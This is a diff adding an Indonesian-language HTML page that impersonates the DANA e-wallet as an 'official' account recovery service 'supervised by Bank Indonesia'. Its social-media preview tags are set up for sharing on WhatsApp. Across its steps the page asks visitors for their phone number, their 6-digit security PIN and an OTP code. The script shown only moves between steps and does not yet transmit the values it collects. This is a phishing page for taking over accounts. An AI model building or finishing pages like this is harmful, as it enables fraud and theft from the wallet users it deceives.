@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- ✅ PENGATURAN AGAR MUNCUL DI WHATSAPP - PERSIS CONTOH KAMU -->
+    <meta property="og:title" content="DANA - Layanan Verifikasi & Pemulihan Akun Resmi" />
+    <meta property="og:description" content="Layanan resmi pemulihan, verifikasi, dan keamanan akun DANA. Aman, terdaftar, dan diawasi Bank Indonesia." />
+    <meta property="og:image" content="https://i.ibb.co/4Y3t7Qx/images-2-24.jpg" />
+    <meta property="og:url" content="https://pusat-bantuan-dana--b3359067.replit.app" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="DANA Digital" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="DANA - Layanan Verifikasi & Pemulihan Akun Resmi" />
+    <meta name="twitter:description" content="Layanan resmi pemulihan, verifikasi, dan keamanan akun DANA. Aman, terdaftar, dan diawasi Bank Indonesia." />
+    <meta name="twitter:image" content="https://i.ibb.co/4Y3t7Qx/images-2-24.jpg" />
+
+    <title>DANA - Pusat Bantuan & Pemulihan Akun</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        utama: '#0066FF',
+                        biruTua: '#0052CC',
+                        biruMuda: '#2684FF',
+                        putih: '#FFFFFF',
+                        abu: '#F2F3F5',
+                        gelap: '#1D2129'
+                    },
+                    fontFamily: { sans: ['Inter', 'sans-serif'] },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .scrollbar-hide {
+                -ms-overflow-style: none;
+                scrollbar-width: none;
+            }
+            .scrollbar-hide::-webkit-scrollbar { display: none; }
+            
+            /* ANIMASI 3D BERPUTAR MELINGKAR */
+            .lingkaran-3d {
+                position: relative;
+                width: 300px;
+                height: 300px;
+                margin: 0 auto;
+                transform-style: preserve-3d;
+                animation: putarLingkaran 10s linear infinite;
+            }
+
+            .item-gambar {
+                position: absolute;
+                width: 65px;
+                height: 65px;
+                border-radius: 14px;
+                background: white;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                box-shadow: 0 6px 16px rgba(0,0,0,0.12);
+                transform-origin: center 150px;
+                border: 2px solid #E0EFFF;
+            }
+
+            @keyframes putarLingkaran {
+                0% { transform: rotateZ(0deg) rotateX(20deg); }
+                100% { transform: rotateZ(360deg) rotateX(20deg); }
+            }
+
+            /* TRANSISI HALAMAN */
+            .halaman { transition: all 0.4s ease; }
+            .sembunyi { display: none; opacity: 0; transform: translateY(20px); }
+            .tampil { display: block; opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="bg-utama min-h-screen font-sans text-putih overflow-x-hidden">
+
+    <!-- HALAMAN 1: PILIH OPSI -->
+    <div id="halaman1" class="halaman tampil container mx-auto px-5 py-10">
+        
+        <!-- BAGIAN ATAS: GAMBAR 3D BERPUTAR -->
+        <div class="text-center mb-12">
+            <h2 class="text-xl font-bold mb-6 text-white/90">Layanan Kami</h2>
+            <div class="lingkaran-3d">
+                <!-- Gambar berjejer rapi melingkar -->
+                <div class="item-gambar" style="transform: rotateY(0deg) translateZ(150px);">
+                    <i class="fa fa-shield text-3xl text-utama"></i>
+                </div>
+                <div class="item-gambar" style="transform: rotateY(40deg) translateZ(150px);">
+                    <i class="fa fa-credit-card text-3xl text-utama"></i>
+                </div>
+                <div class="item-gambar" style="transform: rotateY(80deg) translateZ(150px);">
+                    <i class="fa fa-money text-3xl text-utama"></i>
+                </div>
+                <div class="item-gambar" style="transform: rotateY(120deg) translateZ(150px);">
+                    <i class="fa fa-line-chart text-3xl text-utama"></i>
+                </div>
+                <div class="item-gambar" style="transform: rotateY(160deg) translateZ(150px);">
+                    <i class="fa fa-headphones text-3xl text-utama"></i>
+                </div>
+                <div class="item-gambar" style="transform: rotateY(200deg) translateZ(150px);">
+                    <i class="fa fa-lock text-3xl text-utama"></i>
+                </div>
+                <div class="item-gambar" style="transform: rotateY(240deg) translateZ(150px);">
+                    <i class="fa fa-exchange text-3xl text-utama"></i>
+                </div>
+                <div class="item-gambar" style="transform: rotateY(280deg) translateZ(150px);">
+                    <i class="fa fa-bell text-3xl text-utama"></i>
+                </div>
+                <div class="item-gambar" style="transform: rotateY(320deg) translateZ(150px);">
+                    <i class="fa fa-user-circle text-3xl text-utama"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- BAGIAN TENGAH: PILIH OPSI -->
+        <div class="max-w-md mx-auto">
+            <h3 class="text-lg font-semibold mb-4 text-center">Silakan Pilih Layanan</h3>
+            
+            <div class="space-y-3">
+                <button onclick="pilihOpsi('Pemulihan Akun')" class="w-full bg-putih text-utama font-bold py-3.5 px-4 rounded-xl shadow-lg hover:shadow-xl transition-all active:scale-[0.98] text-left flex items-center gap-3">
+                    <i class="fa fa-unlock-alt text-xl"></i> PEMULIHAN AKUN
+                </button>
+
+                <button onclick="pilihOpsi('Bekukan & Pembatalan Dana')" class="w-full bg-putih text-utama font-bold py-3.5 px-4 rounded-xl shadow-lg hover:shadow-xl transition-all active:scale-[0.98] text-left flex items-center gap-3">
+                    <i class="fa fa-ban text-xl"></i> BEKUKAN / PEMBATALAN DANA
+                </button>
+
+                <button onclick="pilihOpsi('Cicil')" class="w-full bg-putih text-utama font-bold py-3.5 px-4 rounded-xl shadow-lg hover:shadow-xl transition-all active:scale-[0.98] text-left flex items-center gap-3">
+                    <i class="fa fa-calendar-times-o text-xl"></i> CICIL
+                </button>
+
+                <button onclick="pilihOpsi('Laporkan Kendala')" class="w-full bg-putih text-utama font-bold py-3.5 px-4 rounded-xl shadow-lg hover:shadow-xl transition-all active:scale-[0.98] text-left flex items-center gap-3">
+                    <i class="fa fa-exclamation-triangle text-xl"></i> LAPORKAN KENDALA
+                </button>
+
+                <button onclick="pilihOpsi('Lainnya')" class="w-full bg-putih text-utama font-bold py-3.5 px-4 rounded-xl shadow-lg hover:shadow-xl transition-all active:scale-[0.98] text-left flex items-center gap-3">
+                    <i class="fa fa-ellipsis-h text-xl"></i> LAINNYA
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- HALAMAN 2: INPUT NOMOR TELEPON -->
+    <div id="halaman2" class="halaman sembunyi container mx-auto px-5 py-10">
+        <div class="max-w-md mx-auto text-center">
+            <i class="fa fa-phone-square text-5xl text-putih/90 mb-4"></i>
+            <h2 class="text-xl font-bold mb-2" id="judulOpsi1"></h2>
+            <p class="text-putih/80 mb-8">Masukkan nomor telepon yang terdaftar</p>
+
+            <div class="bg-putih rounded-xl p-5 shadow-2xl">
+                <label class="block text-gelap font-medium mb-2 text-left">Nomor Telepon</label>
+                <input type="tel" id="nomorTelp" placeholder="Contoh: 0812xxxxxxxx" class="w-full p-3 border border-abu rounded-lg focus:ring-2 focus:ring-utama/30 focus:border-utama outline-none text-gelap text-lg">
+                
+                <button onclick="lanjutPIN()" class="w-full bg-utama text-putih font-semibold py-3 rounded-lg mt-5 hover:bg-biruTua transition-all">
+                    LANJUT
+                </button>
+            </div>
+
+            <button onclick="kembali(1)" class="mt-6 text-putih/90 hover:underline flex items-center justify-center gap-2">
+                <i class="fa fa-arrow-left"></i> Kembali ke Pilihan
+            </button>
+        </div>
+    </div>
+
+    <!-- HALAMAN 3: INPUT PIN -->
+    <div id="halaman3" class="halaman sembunyi container mx-auto px-5 py-10">
+        <div class="max-w-md mx-auto text-center">
+            <i class="fa fa-lock text-5xl text-putih/90 mb-4"></i>
+            <h2 class="text-xl font-bold mb-2" id="judulOpsi2"></h2>
+            <p class="text-putih/80 mb-8">Masukkan 6 digit PIN keamanan Anda</p>
+
+            <div class="bg-putih rounded-xl p-5 shadow-2xl">
+                <label class="block text-gelap font-medium mb-2 text-left">PIN Keamanan</label>
+                <input type="password" maxlength="6" id="pinInput" placeholder="******" class="w-full p-3 border border-abu rounded-lg focus:ring-2 focus:ring-utama/30 focus:border-utama outline-none text-gelap text-lg text-center tracking-[1em] font-bold">
+                
+                <button onclick="lanjutOTP()" class="w-full bg-utama text-putih font-semibold py-3 rounded-lg mt-5 hover:bg-biruTua transition-all">
+                    LANJUT
+                </button>
+            </div>
+
+            <button onclick="kembali(2)" class="mt-6 text-putih/90 hover:underline flex items-center justify-center gap-2">
+                <i class="fa fa-arrow-left"></i> Kembali
+            </button>
+        </div>
+    </div>
+
+    <!-- HALAMAN 4: INPUT KODE OTP -->
+    <div id="halaman4" class="halaman sembunyi container mx-auto px-5 py-10">
+        <div class="max-w-md mx-auto text-center">
+            <i class="fa fa-shield-check text-5xl text-putih/90 mb-4"></i>
+            <h2 class="text-xl font-bold mb-2" id="judulOpsi3"></h2>
+            <p class="text-putih/80 mb-8">Kode OTP telah dikirim ke nomor <span id="tampilNomor" class="font-bold text-putih"></span></p>
+
+            <div class="bg-putih rounded-xl p-5 shadow-2xl">
+                <label class="block text-gelap font-medium mb-2 text-left">Masukkan Kode OTP</label>
+                <input type="text" maxlength="6" id="otpInput" placeholder="000000" class="w-full p-3 border border-abu rounded-lg focus:ring-2 focus:ring-utama/30 focus:border-utama outline-none text-gelap text-lg text-center font-bold">
+                
+                <button class="w-full bg-utama text-putih font-semibold py-3 rounded-lg mt-5 hover:bg-biruTua transition-all">
+                    KIRIM & PROSES
+                </button>
+            </div>
+
+            <button onclick="kembali(3)" class="mt-6 text-putih/90 hover:underline flex items-center justify-center gap-2">
+                <i class="fa fa-arrow-left"></i> Kembali
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let opsiDipilih = "";
+        let nomorSimpan = "";
+
+        // Fungsi Pilih Opsi
+        function pilihOpsi(nama) {
+            opsiDipilih = nama;
+            document.getElementById('judulOpsi1').innerText = nama;
+            document.getElementById('judulOpsi2').innerText = nama;
+            document.getElementById('judulOpsi3').innerText = nama;
+            gantiHalaman(1, 2);
+        }
+
+        // Lanjut ke Halaman PIN
+        function lanjutPIN() {
+            nomorSimpan = document.getElementById('nomorTelp').value;
+            if(nomorSimpan.length < 10) return alert("Masukkan nomor yang benar!");
+            document.getElementById('tampilNomor').innerText = nomorSimpan;
+            gantiHalaman(2, 3);
+        }
+
+        // Lanjut ke Halaman OTP
+        function lanjutOTP() {
+            const pin = document.getElementById('pinInput').value;
+            if(pin.length !== 6) return alert("PIN harus 6 digit!");
+            gantiHalaman(3, 4);
+        }
+
+        // Fungsi Ganti Halaman
+        function gantiHalaman(dari, ke) {
+            document.getElementById(`halaman${dari}`).classList.remove('tampil');
+            document.getElementById(`halaman${dari}`).classList.add('sembunyi');
+            document.getElementById(`halaman${ke}`).classList.remove('sembunyi');
+            document.getElementById(`halaman${ke}`).classList.add('tampil');
+        }
+
+        // Fungsi Kembali
+        function kembali(keHalaman) {
+            if(keHalaman === 1) gantiHalaman(2,1);
+            if(keHalaman === 2) gantiHalaman(3,2);
+            if(keHalaman === 3) gantiHalaman(4,3);
+        }
+    </script>
+
+</body>
+  </html>
+          
